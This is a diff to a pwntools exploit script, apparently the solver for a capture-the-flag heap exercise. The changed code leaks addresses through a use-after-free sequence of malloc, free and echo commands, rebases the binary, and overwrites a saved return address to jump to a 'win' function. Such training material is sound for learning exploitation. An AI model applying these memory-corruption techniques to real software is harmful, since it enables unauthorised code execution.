@@ -38,16 +38,15 @@ def find_challenge(search_path="/challenge"):
 def one_round(io: pwn.process):
     tee(io)
 
-    io.recvuntil(b"at: ")
-    stack_addr = int(io.recvuntil(b".", drop=True), 16)
-    return_addr = stack_addr + 0x118
-    io.recvuntil(b"at: ")
-    main_addr = int(io.recvuntil(b".", drop=True), 16)
+    def read_argv(offset):
+        io.sendline(b"malloc 0 32")
+        io.sendline(b"free 0")
+        io.sendline(b"echo 0 %d" % offset)
+        io.recvuntil(b"Data: ")
+        return pwn.u64(io.recvline(False).ljust(8, b"\x00"))
 
-    elf = io.elf
-    elf.address = main_addr - elf.symbols["main"]
-
-    win_addr = elf.symbols["win"]
+    string_addr = read_argv(0)
+    return_addr = read_argv(8) + 0xE + 0x8
 
     def write_qword(addr, value):
         io.sendline(b"malloc 0 16")
@@ -61,6 +60,9 @@ def one_round(io: pwn.process):
         io.sendline(b"scanf 1")
         io.sendline(value.to_bytes(8, "little"))
 
+    elf = io.elf
+    elf.address = string_addr - next(elf.search(b"/bin/echo\0"))
+    win_addr = elf.symbols["win"]
     write_qword(return_addr, win_addr)
 
     io.sendline(b"quit")
